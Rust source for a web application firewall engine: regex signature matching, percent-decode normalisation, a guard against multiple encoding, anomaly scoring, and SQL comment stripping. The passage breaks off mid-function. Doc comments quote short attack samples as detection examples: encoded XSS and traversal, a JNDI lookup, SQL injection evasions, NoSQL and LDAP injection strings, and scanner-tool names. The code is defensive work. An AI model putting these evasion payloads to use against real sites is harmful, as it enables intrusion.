//! A pure-Rust Web Application Firewall: signature inspection of the request,
//! IP-free by construction (the cleanest Cloudflare carry-over — see `ROADMAP.md`
//! Phase 3).
//!
//! The engine is a [`regex::RegexSet`] evaluated over the request's method, target
//! (path + query), and header values. `RegexSet` matches every pattern in a single
//! pass and uses `aho-corasick` internally for literal prefiltering, so adding more
//! signatures stays cheap. The starter ruleset covers the classic signature classes
//! (SQLi / XSS / path traversal & file-inclusion wrappers / OS command injection / SSRF /
//! server-side code & expression injection / protocol anomalies / security-scanner
//! fingerprints); it is **not**
//! OWASP-CRS-complete — the 100%-Rust rule (no
//! Coraza/ModSecurity FFI) means CRS coverage is reached by porting rules into this
//! engine, never by linking a foreign one. Rules are operator-extensible: [`Waf::new`]
//! takes any rule iterator, so a caller can extend [`starter_rules`] with its own — and
//! operator-tunable: [`Waf::disable_rule`] / [`Waf::disable_category`] silence a noisy
//! signature or a whole class on the starter set without rebuilding it.
//!
//! Inspection runs each field **twice**: once over the raw string as received, then,
//! if the field was percent-encoded, once more over its decoded form — so an attack
//! hidden behind a single encoding layer (`%3Cscript%3E`, `..%2f`) is caught by the
//! same rules as its plaintext twin. Decoding iterates to a fixed point (capped at
//! [`MAX_DECODE_PASSES`]); input that needs **more than one** pass to settle is
//! *multiply* percent-encoded — a classic evasion tell (`%252e%252e%252f`) with no
//! legitimate use over an onion service — and is blocked outright as a protocol anomaly
//! (rule id [`MULTI_ENCODING_RULE_ID`]). That guard is on by default and can be relaxed
//! with [`Waf::block_multi_encoded`]; with it off, the fully-decoded form is still
//! matched against the ruleset, so the payload is usually caught anyway, just attributed
//! to its specific rule rather than to the evasion attempt.
//!
//! The engine is wired ahead of the gate in the [`SkinLayer`](crate::layer) layer
//! order (WAF → clearance → challenge → rate-limit); it is off unless a [`Waf`] is
//! configured, and [`Skin::secure_default`](crate::layer::Skin::secure_default) turns
//! on the [`starter`](Waf::starter) ruleset.

use axum::http::request::Parts;
use regex::RegexSet;

/// Maximum number of percent-decode passes [`normalize`] performs before giving up.
/// One pass peels a single encoding layer; reaching this cap means the input was
/// multiply encoded (or maliciously deep) and is treated as evasive regardless.
pub const MAX_DECODE_PASSES: usize = 4;

/// The synthetic rule id reported when input is blocked for being multiply
/// percent-encoded (see [`Waf::block_multi_encoded`]). It is not part of
/// [`starter_rules`] — the engine emits it directly.
pub const MULTI_ENCODING_RULE_ID: &str = "anomaly_multiple_encoding";

/// The signature class a rule belongs to.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum WafCategory {
	/// SQL injection.
	Sqli,
	/// Cross-site scripting.
	Xss,
	/// Path / directory traversal (and local/remote file-inclusion wrappers).
	PathTraversal,
	/// OS command injection (shell metacharacters chaining a command).
	CommandInjection,
	/// Server-side request forgery: a request trying to make the server fetch an
	/// internal/loopback/metadata URL. IP-free to detect (the *URL value* is in the
	/// request), so it survives the loss of client IP and ports directly over Tor.
	Ssrf,
	/// Server-side code / expression injection: payloads that drive the server to evaluate
	/// attacker-controlled code — Log4Shell-style `${jndi:…}` JNDI lookups, server-side
	/// template-injection probes, and serialized-object (deserialization) gadgets. Pure
	/// request-value inspection, so it ports over Tor unchanged.
	CodeInjection,
	/// NoSQL injection: MongoDB-style query-operator smuggling — a `$where` server-side JS
	/// predicate, a JSON operator key (`{"$ne": …}`), or the HTTP-parameter operator form
	/// (`user[$ne]=`). The operator is a literal *value in the request*, so detection needs
	/// no client IP and ports directly over Tor.
	NoSqlInjection,
	/// LDAP injection: input that breaks out of an LDAP search filter — closing a clause and
	/// opening a boolean group (`)(|`, `*)(uid=*`) to force an always-true filter or an
	/// authentication bypass. The malicious filter syntax is a value in the request, so
	/// detection is IP-free and ports over Tor unchanged.
	LdapInjection,
	/// XML external entity (XXE): an XML payload declaring an entity (`<!ENTITY`) — often an
	/// *external* one (`SYSTEM`/`PUBLIC`) pointing at a local file or internal URL — or a
	/// DOCTYPE carrying an inline DTD subset (`[ … ]`). Drives the server's XML parser to
	/// read a file or make a request; the markup is a value in the request body/fields, so
	/// detection needs no client IP. Keyed on `<!ENTITY` rather than `<!DOCTYPE` for the
	/// external-reference rule, so a legitimate HTML/XHTML doctype (which uses `PUBLIC`/
	/// `SYSTEM` without an entity) does not false-positive.
	Xxe,
	/// Malformed or anomalous protocol input (control chars, header injection).
	ProtocolAnomaly,
	/// Security-scanner / attack-tool fingerprint: a request that self-identifies as a known
	/// offensive tool (sqlmap, nikto, ghauri, WhatWAF, nuclei, …) — usually via its
	/// `User-Agent`, though the signature matches wherever the token appears. This is the
	/// OWASP-CRS 913xxx "scanner detection" tier ported to the pure-Rust engine. It keys on a
	/// literal *value in the request*, so it needs no client IP and survives directly over Tor;
	/// it *complements* the softer [`BotHeuristics`](crate::bot::BotHeuristics) score by hard
	/// blocking the unambiguously-hostile tools rather than merely weighting them.
	ScannerDetection,
}

impl WafCategory {
	/// Every category, in [`index`](Self::index) order — for iterating per-category metrics.
	pub const ALL: [WafCategory; 11] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly, Self::NoSqlInjection, Self::LdapInjection, Self::Xxe, Self::ScannerDetection];

	/// A stable, lowercase name for logs and security events.
	#[must_use]
	pub const fn name(self) -> &'static str {
		match self {
			Self::Sqli => "sqli",
			Self::Xss => "xss",
			Self::PathTraversal => "path_traversal",
			Self::CommandInjection => "command_injection",
			Self::Ssrf => "ssrf",
			Self::CodeInjection => "code_injection",
			Self::NoSqlInjection => "nosql_injection",
			Self::LdapInjection => "ldap_injection",
			Self::Xxe => "xxe",
			Self::ProtocolAnomaly => "protocol_anomaly",
			Self::ScannerDetection => "scanner_detection",
		}
	}

	/// The default anomaly **weight** this category contributes to an aggregate score in
	/// [`anomaly_score`] / [`Waf::inspect_all`]. The scale mirrors OWASP-CRS severities
	/// (critical injection/RCE/SSRF/LFI classes weigh most, protocol oddities least); the
	/// *threshold* an operator compares the sum against is the tuning knob, not these
	/// weights. Used only by the collect-all scoring path; the first-match [`Waf::inspect`]
	/// fast path does not score.
	#[must_use]
	pub const fn weight(self) -> u32 {
		match self {
			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection | Self::NoSqlInjection | Self::LdapInjection | Self::Xxe | Self::ScannerDetection => 5,
			Self::Xss => 4,
			Self::ProtocolAnomaly => 3,
		}
	}

	/// A stable dense index in `0..`[`ALL.len()`](Self::ALL), for array-backed per-category
	/// counters. `WafCategory::ALL[c.index()] == c` for every category.
	#[must_use]
	pub const fn index(self) -> usize {
		match self {
			Self::Sqli => 0,
			Self::Xss => 1,
			Self::PathTraversal => 2,
			Self::CommandInjection => 3,
			Self::Ssrf => 4,
			Self::CodeInjection => 5,
			Self::ProtocolAnomaly => 6,
			Self::NoSqlInjection => 7,
			Self::LdapInjection => 8,
			Self::Xxe => 9,
			Self::ScannerDetection => 10,
		}
	}
}

/// A single signature rule: a stable `id`, its [`WafCategory`], and a regex `pattern`.
/// Patterns are case-handling at the author's discretion (prefix `(?i)` for
/// case-insensitive); they are compiled together into one [`RegexSet`].
#[derive(Clone, Debug)]
pub struct Rule {
	/// Stable identifier surfaced on a block (e.g. `"sqli_union_select"`).
	pub id: &'static str,
	/// The signature class.
	pub category: WafCategory,
	/// The regex source matched against each inspected string.
	pub pattern: &'static str,
}

/// What [`Waf::inspect`] decided about a request.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Verdict {
	/// No signature matched; let the request through.
	Allow,
	/// A signature matched; the request should be blocked (typically `403`).
	Block(WafMatch),
}

/// The rule that fired and where it matched.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct WafMatch {
	/// The matched rule's [`Rule::id`].
	pub rule_id: &'static str,
	/// The matched rule's class.
	pub category: WafCategory,
	/// Which part of the request matched (e.g. `"target"`, `"header:user-agent"`).
	pub location: String,
	/// When this match is the representative of an anomaly-**scoring** block (see
	/// [`Waf::scoring_threshold`]), the aggregate [`anomaly_score`] of every signature the
	/// request tripped — the number that crossed the threshold. `None` for a first-match
	/// block, for the multiple-encoding hard block, and for the individual matches returned
	/// by [`Waf::inspect_all`].
	pub score: Option<u32>,
}

/// The compiled WAF: a [`RegexSet`] plus index-aligned rule metadata.
pub struct Waf {
	set: RegexSet,
	/// Metadata for each pattern, in the same order passed to the [`RegexSet`].
	meta: Vec<(&'static str, WafCategory)>,
	/// Per-rule enable mask, index-aligned with [`meta`](Self::meta). A disabled rule is
	/// skipped by [`match_raw`](Self::match_raw) as if it had not matched; all rules start
	/// enabled. Operators silence a noisy rule or a whole class with
	/// [`disable_rule`](Self::disable_rule) / [`disable_category`](Self::disable_category)
	/// without rebuilding the rule list.
	enabled: Vec<bool>,
	/// When true (default), input requiring more than one percent-decode pass to reach a
	/// fixed point is blocked outright as a [`WafCategory::ProtocolAnomaly`].
	block_multi_encoded: bool,
	/// When `Some(cap)`, request bodies are inspected up to `cap` bytes (the host layer
	/// buffers that much before forwarding). `None` (default) leaves bodies uninspected —
	/// body inspection means buffering, a request-handling cost the operator opts into.
	body_inspection: Option<usize>,
	/// When `Some(threshold)`, [`inspect`](Self::inspect) blocks on the *aggregate*
	/// [`anomaly_score`] of all signatures reaching `threshold` rather than on the first
	/// match. `None` (default) is first-match-blocks. The multiple-encoding guard still hard
	/// blocks independently of the threshold when armed.
	scoring_threshold: Option<u32>,
	/// Per-category anomaly weights for the scoring path, indexed by [`WafCategory::index`].
	/// Initialized from [`WafCategory::weight`] and overridable per-category with
	/// [`set_category_weight`](Self::set_category_weight), so an operator can tune one class's
	/// contribution to the aggregate score (e.g. weigh a noisy protocol-anomaly signal less)
	/// without touching the threshold — the OWASP-CRS per-rule severity knob, one level up.
	/// Used by [`score`](Self::score) and the scoring [`inspect`](Self::inspect) path; the free
	/// [`anomaly_score`] function keeps using the unmodified defaults.
	weights: [u32; WafCategory::ALL.len()],
	/// Operator-authored custom rules expressed in the [`FilterExpr`](crate::filter::FilterExpr)
	/// language — whole-request predicates evaluated alongside the built-in signature set (see
	/// [`custom_rule`](Self::custom_rule)). Empty by default.
	custom: Vec<CustomRule>,
}

/// A custom operator rule authored in the filter-expression language: a whole-request
/// [`FilterExpr`](crate::filter::FilterExpr) predicate paired with a stable id and a
/// [`WafCategory`]. Built and appended by [`Waf::custom_rule`] / [`Waf::custom_expr_rule`];
/// matches report `location = "custom"`.
struct CustomRule {
	id: &'static str,
	category: WafCategory,
	expr: crate::filter::FilterExpr,
}

impl Waf {
	/// Compile a WAF from a set of [`Rule`]s. Returns an error if any pattern fails to
	/// compile (so an operator's custom rule is validated up front).
	///
	/// # Errors
	/// Propagates [`regex::Error`] from [`RegexSet::new`] if a pattern is invalid.
	pub fn new(rules: impl IntoIterator<Item = Rule>) -> Result<Self, regex::Error> {
		let rules: Vec<Rule> = rules.into_iter().collect();
		let set = RegexSet::new(rules.iter().map(|r| r.pattern))?;
		let meta: Vec<(&'static str, WafCategory)> = rules.iter().map(|r| (r.id, r.category)).collect();
		let enabled = vec![true; meta.len()];
		let mut weights = [0u32; WafCategory::ALL.len()];
		for cat in WafCategory::ALL {
			weights[cat.index()] = cat.weight();
		}
		Ok(Self { set, meta, enabled, block_multi_encoded: true, body_inspection: None, scoring_threshold: None, weights, custom: Vec::new() })
	}

	/// Set whether multiply percent-encoded input is blocked outright as a protocol
	/// anomaly (default `true`). With it `false`, the engine still matches the
	/// fully-decoded form against the ruleset — so the payload is usually caught anyway,
	/// just attributed to its specific rule rather than to the evasion attempt.
	#[must_use]
	pub fn block_multi_encoded(mut self, block: bool) -> Self {
		self.block_multi_encoded = block;
		self
	}

	/// Disable the rule with the given [`Rule::id`], so it never fires (an unknown id is a
	/// no-op). Lets an operator silence a single false-positive-prone signature while
	/// keeping the rest of the ruleset, without reconstructing it from a filtered list.
	/// Composes with [`disable_category`](Self::disable_category); disabling is sticky and
	/// idempotent.
	#[must_use]
	pub fn disable_rule(mut self, id: &str) -> Self {
		for (i, (rule_id, _)) in self.meta.iter().enumerate() {
			if *rule_id == id {
				self.enabled[i] = false;
			}
		}
		self
	}

	/// Disable every rule in the given [`WafCategory`], so that whole signature class never
	/// fires. Note this does **not** affect the multiple-encoding anomaly guard, which is
	/// controlled independently by [`block_multi_encoded`](Self::block_multi_encoded) even
	/// though it reports as a [`WafCategory::ProtocolAnomaly`].
	#[must_use]
	pub fn disable_category(mut self, category: WafCategory) -> Self {
		for (i, (_, cat)) in self.meta.iter().enumerate() {
			if *cat == category {
				self.enabled[i] = false;
			}
		}
		self
	}

	/// Whether the rule with the given [`Rule::id`] is currently enabled. Returns `false`
	/// for an unknown id (it can never fire either).
	#[must_use]
	pub fn is_rule_enabled(&self, id: &str) -> bool {
		self.meta.iter().zip(&self.enabled).any(|((rule_id, _), &on)| *rule_id == id && on)
	}

	/// The number of rules currently enabled (`<=` [`rule_count`](Self::rule_count)).
	#[must_use]
	pub fn enabled_rule_count(&self) -> usize {
		self.enabled.iter().filter(|&&on| on).count()
	}

	/// Enable request-**body** inspection, buffering and scanning up to `max_bytes` of the
	/// body (default: off). The host [`SkinLayer`](crate::layer) buffers at most this many
	/// bytes of a forwarded request's body before passing it on; a body that exceeds the
	/// cap is refused (`413`). Off by default because buffering is a per-request cost and a
	/// hard size cap is a behaviour change the operator should choose explicitly.
	#[must_use]
	pub fn inspect_body_up_to(mut self, max_bytes: usize) -> Self {
		self.body_inspection = Some(max_bytes);
		self
	}

	/// The configured body-inspection byte cap, or `None` if body inspection is off.
	#[must_use]
	pub fn body_cap(&self) -> Option<usize> {
		self.body_inspection
	}

	/// Switch [`inspect`](Self::inspect) into OWASP-CRS-style **anomaly-scoring** mode: a
	/// request is blocked when the [`anomaly_score`] of *all* the signatures it trips reaches
	/// `threshold`, rather than on the first single match. This lets several sub-blocking
	/// signals combine, and lets an operator raise `threshold` to tolerate one weak hit. The
	/// multiple-encoding guard (when armed) still hard-blocks independently of the score.
	/// Default (without this call) is first-match-blocks.
	#[must_use]
	pub fn scoring_threshold(mut self, threshold: u32) -> Self {
		self.scoring_threshold = Some(threshold);
		self
	}

	/// Override the anomaly **weight** a [`WafCategory`] contributes to the aggregate score in
	/// [`scoring_threshold`](Self::scoring_threshold) mode, replacing its [`WafCategory::weight`]
	/// default for this WAF. Lets an operator tune one attack class up or down relative to the
	/// threshold — for example weighing a chatty protocol-anomaly signal less so it no longer
	/// pushes borderline-clean requests over — without rebuilding the ruleset. Sticky and
	/// idempotent; composes with [`disable_rule`](Self::disable_rule). Affects only the scoring
	/// path (instance [`score`](Self::score) and scoring-mode [`inspect`](Self::inspect)); the
	/// free [`anomaly_score`] function still uses the unmodified defaults.
	#[must_use]
	pub fn set_category_weight(mut self, category: WafCategory, weight: u32) -> Self {
		self.weights[category.index()] = weight;
		self
	}

	/// The anomaly weight this WAF currently assigns a [`WafCategory`] — its
	/// [`WafCategory::weight`] default unless overridden by
	/// [`set_category_weight`](Self::set_category_weight).
	#[must_use]
	pub fn category_weight(&self, category: WafCategory) -> u32 {
		self.weights[category.index()]
	}

	/// Add an operator-authored custom rule written in the
	/// [`FilterExpr`](crate::filter::FilterExpr) rule language — the same string grammar the
	/// [edge rules](crate::edge::EdgeMatch::expr) use — parsed with
	/// [`FilterExpr::parse`](crate::filter::FilterExpr::parse). Unlike the regex signature rules
	/// (which match field *content*), a custom rule is a whole-request predicate over the
	/// method, path, query, and headers (`method eq "POST" and path starts_with "/wp-login"`),
	/// so it blocks a request *shape* the built-in signatures do not describe. A firing custom
	/// rule reports `location = "custom"` under the given `id` and `category`, and — like any
	/// other match — contributes its category weight to [anomaly scoring](Self::scoring_threshold).
	///
	/// In first-match mode a built-in signature match still takes precedence (custom rules are
	/// evaluated after the signature fields); in scoring mode custom hits are summed with the rest.
	///
	/// # Errors
	/// Returns the [`ParseError`](crate::filter::ParseError) from the filter parser if `rule`
	/// fails to lex or parse (unknown field/operator, invalid regex, unbalanced group, …), so a
	/// malformed operator rule is rejected up front rather than silently ignored.
	pub fn custom_rule(mut self, id: &'static str, category: WafCategory, rule: &str) -> Result<Self, crate::filter::ParseError> {
		let expr = crate::filter::FilterExpr::parse(rule)?;
		self.custom.push(CustomRule { id, category, expr });
		Ok(self)
	}

	/// Add a custom rule from an already-built [`FilterExpr`](crate::filter::FilterExpr) (the
	/// programmatic counterpart of [`custom_rule`](Self::custom_rule), for rules assembled with
	/// the [`Field`](crate::filter::Field) builders rather than parsed from a string).
	#[must_use]
	pub fn custom_expr_rule(mut self, id: &'static str, category: WafCategory, expr: crate::filter::FilterExpr) -> Self {
		self.custom.push(CustomRule { id, category, expr });
		self
	}

	/// The number of custom [`FilterExpr`](crate::filter::FilterExpr) rules added on top of the
	/// signature ruleset (see [`custom_rule`](Self::custom_rule)).
	#[must_use]
	pub fn custom_rule_count(&self) -> usize {
		self.custom.len()
	}

	/// The first custom [`FilterExpr`](crate::filter::FilterExpr) rule that matches the request,
	/// as a [`WafMatch`] located at `"custom"`. `None` if no custom rule fires (or none exist).
	fn match_custom(&self, parts: &Parts) -> Option<WafMatch> {
		self.custom.iter().find(|r| r.expr.evaluate(parts)).map(|r| WafMatch { rule_id: r.id, category: r.category, location: "custom".to_owned(), score: None })
	}

	/// Append every matching custom rule to `out` (the collect-all counterpart of
	/// [`match_custom`](Self::match_custom), for the scoring path).
	fn match_custom_all(&self, parts: &Parts, out: &mut Vec<WafMatch>) {
		for r in &self.custom {
			if r.expr.evaluate(parts) {
				out.push(WafMatch { rule_id: r.id, category: r.category, location: "custom".to_owned(), score: None });
			}
		}
	}

	/// Sum this WAF's (possibly overridden) per-category weights over a set of matches — the
	/// instance counterpart of the free [`anomaly_score`] function, which always uses the
	/// category defaults. This is the score the scoring-mode [`inspect`](Self::inspect)
	/// compares against the threshold. Pair with [`inspect_all`](Self::inspect_all).
	#[must_use]
	pub fn score(&self, matches: &[WafMatch]) -> u32 {
		matches.iter().map(|m| self.weights[m.category.index()]).sum()
	}

	/// Inspect a request body's bytes with the same rules and normalization as every
	/// other field. The bytes are interpreted as UTF-8 lossily (so a binary body still
	/// scans for embedded ASCII signatures). The caller is responsible for honoring
	/// [`body_cap`](Self::body_cap); this scans exactly the slice it is given.
	#[must_use]
	pub fn inspect_body(&self, body: &[u8]) -> Verdict {
		let text = String::from_utf8_lossy(body);
		match self.inspect_str(&text, "body") {
			Some(m) => Verdict::Block(m),
			None => Verdict::Allow,
		}
	}

	/// The default WAF over [`starter_rules`]. The starter patterns are known-good and
	/// covered by a compile test.
	#[must_use]
	pub fn starter() -> Self {
		Self::new(starter_rules()).expect("starter rules compile")
	}

	/// The number of compiled rules.
	#[must_use]
	pub fn rule_count(&self) -> usize {
		self.meta.len()
	}

	/// Match the ruleset against one literal string in a single pass; take the lowest
	/// rule index for a stable, deterministic result. `location` labels where the string
	/// came from for the returned [`WafMatch`].
	fn match_raw(&self, haystack: &str, location: &str) -> Option<WafMatch> {
		self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx]).min().map(|idx| {
			let (rule_id, category) = self.meta[idx];
			WafMatch { rule_id, category, location: location.to_owned(), score: None }
		})
	}

	/// Inspect one field whose encoding follows path/header rules (`%XX` only, `+` is a
	/// literal). Body inspection and the tests use this; query strings use
	/// [`inspect_field`](Self::inspect_field) with `plus_is_space = true`.
	fn inspect_str(&self, raw: &str, location: &str) -> Option<WafMatch> {
		self.inspect_field(raw, location, false)
	}

	/// Inspect one field: match the raw string, then — if normalization changes it — its
	/// decoded form, applying the multiple-encoding guard. With `plus_is_space`, a `+` is
	/// first folded to a space (`application/x-www-form-urlencoded` semantics), so a
	/// `+`-spaced payload (`a+OR+1=1`) trips the same rules as its space form. `location`
	/// labels where the string came from for the returned [`WafMatch`].
	fn inspect_field(&self, raw: &str, location: &str, plus_is_space: bool) -> Option<WafMatch> {
		// 1. The raw string exactly as received.
		if let Some(m) = self.match_raw(raw, location) {
			return Some(m);
		}
		// 2. Normalize: optional '+'→space, then percent-decode to a fixed point.
		let norm = normalize(raw, plus_is_space);
		// 3. Multiply percent-encoded input is itself the signal: block it as an anomaly.
		//    With the guard off, fall through and let the decoded form match a specific rule.
		if self.block_multi_encoded && norm.decode_passes >= 2 {
			return Some(WafMatch {
				rule_id: MULTI_ENCODING_RULE_ID,
				category: WafCategory::ProtocolAnomaly,
				location: location.to_owned(),
				score: None,
			});
		}
		// 4. Match the decoded form, but only when normalization actually changed it
		//    (nothing encoded → raw was the whole story, already checked).
		if norm.decoded != raw
			&& let Some(m) = self.match_raw(&norm.decoded, location)
		{
			return Some(m);
		}
		// 5. Match the comment-stripped, whitespace-collapsed form of the decoded string, to
		//    close the whitespace/comment-padding evasion (`UNION/**/SELECT`, `AND  1=1`). Only
		//    when the transform actually changed something (a plain payload skips this pass).
		let stripped = strip_sql_comments_collapse_ws(&norm.decoded);
		if stripped != norm.decoded {
			return self.match_raw(&stripped, location);
		}
		None
	}

	/// Inspect a request's method, path, query string, and header values. The query is
	/// scanned with `+`→space form-decoding; the path and headers are not (a `+` is
	/// literal there). Returns [`Verdict::Block`] on the first matching signature, else
	/// [`Verdict::Allow`].
	#[must_use]
	pub fn inspect(&self, parts: &Parts) -> Verdict {
		if let Some(threshold) = self.scoring_threshold {
			return self.inspect_scored(parts, threshold);
		}
		if let Some(m) = self.inspect_field(parts.method.as_str(), "method", false) {
			return Verdict::Block(m);
		}
		if let Some(m) = self.inspect_field(parts.uri.path(), "target", false) {
			return Verdict::Block(m);
		}
		if let Some(query) = parts.uri.query()
			&& let Some(m) = self.inspect_field(query, "query", true)
		{
			return Verdict::Block(m);
		}
		for (name, value) in &parts.headers {
			if let Ok(s) = value.to_str()
				&& let Some(m) = self.inspect_field(s, &format!("header:{name}"), false)
			{
				return Verdict::Block(m);
			}
		}
		// Operator-authored custom rules run after the built-in signature fields, so a
		// signature block keeps precedence in first-match mode.
		if let Some(m) = self.match_custom(parts) {
			return Verdict::Block(m);
		}
		Verdict::Allow
	}

	/// The anomaly-scoring decision for [`inspect`](Self::inspect) when a
	/// [`scoring_threshold`](Self::scoring_threshold) is set. Blocks if any field is
	/// multiply percent-encoded (the armed guard, independent of the score), else if the
	/// aggregate [`anomaly_score`] reaches `threshold`. The reported [`WafMatch`] is the
	/// highest-weight signature (ties broken toward the earliest in inspection order), so a
	/// scored block names the most severe rule that drove it.
	fn inspect_scored(&self, parts: &Parts, threshold: u32) -> Verdict {
		let matches = self.inspect_all(parts);
		if self.block_multi_encoded && let Some(m) = matches.iter().find(|m| m.rule_id == MULTI_ENCODING_RULE_ID) {
			return Verdict::Block(m.clone());
		}
		let total = self.score(&matches);
		if total < threshold {
			return Verdict::Allow;
		}
		// Name the most severe rule that drove the block; on a weight tie keep the earliest
		// (inspection order is method → target → query → headers, lowest rule index first).
		// Tag it with the aggregate score that crossed the threshold so a scored block is
		// distinguishable downstream from a single-signature one. Severity uses this WAF's
		// (possibly overridden) weights, consistent with the score that crossed the threshold.
		let dominant = matches.iter().enumerate().max_by_key(|(i, m)| (self.category_weight(m.category), std::cmp::Reverse(*i))).map(|(_, m)| {
			let mut m = m.clone();
			m.score = Some(total);
			m
		});
		dominant.map_or(Verdict::Allow, Verdict::Block)
	}

	/// Match the ruleset against one string and return **every** enabled rule that fires
	/// (not just the lowest index), in ascending rule order. The collect-all counterpart of
	/// [`match_raw`](Self::match_raw).
	fn match_all_raw(&self, haystack: &str, location: &str, out: &mut Vec<WafMatch>) {
		for idx in self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx]) {
			let (rule_id, category) = self.meta[idx];
			out.push(WafMatch { rule_id, category, location: location.to_owned(), score: None });
		}
	}

	/// Collect every distinct rule that fires on one field, over both the raw and (if
	/// normalization changes it) the decoded form. A rule that matches both forms is
	/// reported once (dedup by `rule_id` within the field). The multiple-encoding guard, when
	/// armed, contributes its anomaly the same way [`inspect_field`](Self::inspect_field)
	/// would block on it.
	fn inspect_field_all(&self, raw: &str, location: &str, plus_is_space: bool, out: &mut Vec<WafMatch>) {
		let start = out.len();
		self.match_all_raw(raw, location, out);
		let norm = normalize(raw, plus_is_space);
		if self.block_multi_encoded && norm.decode_passes >= 2 {
			out.push(WafMatch { rule_id: MULTI_ENCODING_RULE_ID, category: WafCategory::ProtocolAnomaly, location: location.to_owned(), score: None });
			return;
		}
		if norm.decoded != raw {
			let mut decoded = Vec::new();
			self.match_all_raw(&norm.decoded, location, &mut decoded);
			for m in decoded {
				if !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
					out.push(m);
				}
			}
		}
		// The comment-stripped / whitespace-collapsed form contributes its matches too, deduped
		// by rule id within this field, so padding-evaded signatures still surface in scoring.
		let stripped = strip_sql_comments_collapse_ws(&norm.decoded);
		if stripped != norm.decoded {
			let mut extra = Vec::new();
			self.match_all_raw(&stripped, location, &mut extra);
			for m in extra {
				if !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
					out.push(m);
				}
			}
		}
	}

	/// Inspect a request and return **every** signature that fires across the method, path,
	/// query, and header values — the collect-all counterpart of the first-match
	/// [`inspect`](Self::inspect). Useful for observability ("what did this request trip?")
	/// and for [`anomaly_score`], where several weak signals combine. Bodies are not scanned
	/// here (body inspection stays the separate, opt-in [`inspect_body`](Self::inspect_body)
	/// path). The returned matches are grouped by field in inspection order; an empty vec
	/// means the request is clean.
	#[must_use]
	pub fn inspect_all(&self, parts: &Parts) -> Vec<WafMatch> {
		let mut out = Vec::new();
		self.inspect_field_all(parts.method.as_str(), "method", false, &mut out);
		self.inspect_field_all(parts.uri.path(), "target", false, &mut out);
		if let Some(query) = parts.uri.query() {
			self.inspect_field_all(query, "query", true, &mut out);
		}
		for (name, value) in &parts.headers {
			if let Ok(s) = value.to_str() {
				self.inspect_field_all(s, &format!("header:{name}"), false, &mut out);
			}
		}
		// Custom filter-expression rules contribute to the aggregate score too.
		self.match_custom_all(parts, &mut out);
		out
	}
}

/// Sum the [`WafCategory::weight`] of each match into a single anomaly score. Zero for an
/// empty slice (a clean request). An operator compares this against a chosen threshold to
/// decide whether the *aggregate* of several signals — none necessarily blocking on its
/// own under first-match — warrants a block, the OWASP-CRS anomaly-scoring model ported to
/// this engine. Pair with [`Waf::inspect_all`]. This uses the category *defaults*; for a WAF
/// with per-category weight overrides ([`Waf::set_category_weight`]) use the instance method
/// [`Waf::score`] instead, which is what the scoring-mode [`Waf::inspect`] path compares.
#[must_use]
pub fn anomaly_score(matches: &[WafMatch]) -> u32 {
	matches.iter().map(|m| m.category.weight()).sum()
}

impl Default for Waf {
	fn default() -> Self {
		Self::starter()
	}
}

/// The result of [`normalize`]: the fully percent-decoded string and how many decode
/// passes it took to settle (`0` = nothing was encoded).
struct Normalized {
	decoded: String,
	decode_passes: usize,
}

/// Normalize `input` for matching: when `plus_is_space`, first fold `+` to a space
/// (`application/x-www-form-urlencoded` semantics), then iteratively percent-decode
/// until it stops changing or [`MAX_DECODE_PASSES`] is reached. `decode_passes` counts
/// only the percent-decode passes (the `+` fold is not multi-encoding), distinguishing
/// un-encoded (`0`), singly-encoded (`1`), and the evasive multiply-encoded (`>= 2`)
/// cases. `decoded` may differ from `input` through the `+` fold alone.
fn normalize(input: &str, plus_is_space: bool) -> Normalized {
	let mut cur = if plus_is_space { input.replace('+', " ") } else { input.to_owned() };
	let mut passes = 0;
	while passes < MAX_DECODE_PASSES {
		let (next, changed) = percent_decode_once(&cur);
		if !changed {
			break;
		}
		cur = next;
		passes += 1;
	}
	Normalized { decoded: cur, decode_passes: passes }
}

/// Percent-decode `input` once: each well-formed `%XX` (two hex digits) becomes its
/// byte; a malformed `%` (truncated or non-hex) is left verbatim. Returns the decoded
/// string and whether any `%XX` was replaced. Decoding works on raw bytes and finishes
/// with [`String::from_utf8_lossy`], so multi-byte UTF-8 already in `input` survives and
/// the output is always valid UTF-8 for matching.
fn percent_decode_once(input: &str) -> (String, bool) {
	let bytes = input.as_bytes();
	let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
	let mut changed = false;
	let mut i = 0;
	while i < bytes.len() {
		if bytes[i] == b'%'
			&& i + 2 < bytes.len()
			&& let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2]))
		{
			out.push((h << 4) | l);
			changed = true;
			i += 3;
			continue;
		}
		out.push(bytes[i]);
		i += 1;
	}
	(String::from_utf8_lossy(&out).into_owned(), changed)
}

/// Strip SQL block comments and collapse internal whitespace, producing a canonical form for
/// the WAF to match alongside the raw and percent-decoded forms. This closes the
/// whitespace/comment-padding evasion class (OWASP-CRS 4.25.0 LTS rule 933111,
/// CVE-2026-33691): an attacker splits a keyword sequence with `/**/` or excess whitespace
/// (`UNION/**/SELECT`, `OR/**/1=1`, `id=1  AND  1=1`) to slip past a space-sensitive
/// signature. Two transforms, in order:
///
/// 1. **Block comments** — an ordinary `/* … */` is elided to a single space (MySQL treats it
///    as a token separator), so `UNION/**/SELECT` normalizes to `UNION SELECT`. A MySQL
///    *executable* comment `/*!12345 … */` keeps its payload (the delimiters and any version
///    digits become spaces), so `/*!50000UNION*/SELECT` normalizes to `UNION SELECT` too.
/// 2. **Whitespace** — every run of ASCII whitespace collapses to one space, and the result is
///    trimmed, so padding like `AND    1=1` folds to `AND 1=1`.
///
/// Splitting a keyword *inside* a token (`un/**/ion`) is left broken on purpose: MySQL does not
/// rejoin it either, so `un ion` is correctly not the `union` keyword. Decoding works on raw
/// bytes and finishes with [`String::from_utf8_lossy`], mirroring [`percent_decode_once`].
fn strip_sql_comments_collapse_ws(input: &str) -> String {
	let b = input.as_bytes();
	let mut out: Vec<u8> = Vec::with_capacity(b.len());
	let mut i = 0;
	while i < b.len() {
		if b[i] == b'/' && b.get(i + 1) == Some(&b'*') {
